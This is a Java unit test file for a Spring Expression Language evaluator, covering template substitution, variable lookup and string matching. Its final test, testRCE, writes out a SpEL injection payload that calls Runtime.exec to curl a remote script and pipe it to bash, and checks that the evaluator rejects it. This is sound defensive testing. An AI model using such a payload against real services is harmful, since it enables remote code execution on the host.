package com.wind.script.spring;

import com.google.common.collect.ImmutableMap;
import com.wind.common.exception.BaseException;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.spel.support.StandardEvaluationContext;

import java.util.HashMap;
import java.util.Map;

class SpringExpressionEvaluatorTests {

    @Test
    void testEval1() {
        Map<String, Object> evaluationContext = new HashMap<>();
        evaluationContext.put("name", "张三");
        evaluationContext.put("sex", "男");
        String text = SpringExpressionEvaluator.TEMPLATE.eval("这是一个操作，操作人：{#name}，性别：{#sex}", evaluationContext);
        String expected = "这是一个操作，操作人：张三，性别：男";
        Assertions.assertEquals(expected, text);
        text = SpringExpressionEvaluator.TEMPLATE.eval(expected, evaluationContext);
        Assertions.assertEquals(expected, text);
    }

    @Test
    void testEval2() {
        EvaluationContext evaluationContext = new StandardEvaluationContext();
        evaluationContext.setVariable("id", "1");
        evaluationContext.setVariable("user", ImmutableMap.of("id", "2"));
        Assertions.assertEquals("1", SpringExpressionEvaluator.DEFAULT.eval("#id", evaluationContext));
        Assertions.assertEquals("2", SpringExpressionEvaluator.TEMPLATE.eval("{#user['id']}", evaluationContext));
    }

    @Test
    void testEval3() {
        ImmutableMap<String, Object> variables = ImmutableMap.of("id", "2");
        Assertions.assertEquals("2", SpringExpressionEvaluator.DEFAULT.eval("#id", variables));
        Assertions.assertNull(SpringExpressionEvaluator.TEMPLATE.eval("{#name}", variables));
    }

    @Test
    void testStringMatch() {
        Boolean result = SpringExpressionEvaluator.DEFAULT.eval("T(com.wind.common.util.StringMatchUtils).containsAny('测试1', {'测试', " +
                "'测试1', '测试2'})");
        Assertions.assertEquals(Boolean.TRUE, result);
        result = SpringExpressionEvaluator.DEFAULT.eval("T(com.wind.common.util.StringMatchUtils).containsAny('test1', {'测试', " +
                "'测试1', '测试2'})");
        Assertions.assertNotEquals(Boolean.TRUE, result);
    }

    @Test
    void testRCE() {
        // 恶意用户可能通过输入这样的 SpEL 表达式来执行任意命令：
        String expression = "T(java.lang.Runtime).getRuntime().exec('curl http://examle.com/1.sh | bash')";
        BaseException exception = Assertions.assertThrows(BaseException.class, () -> SpringExpressionEvaluator.DEFAULT.eval(expression));
        Assertions.assertEquals("不允许调用 class name = java.lang.Runtime 的方法",exception.getMessage());
    }
}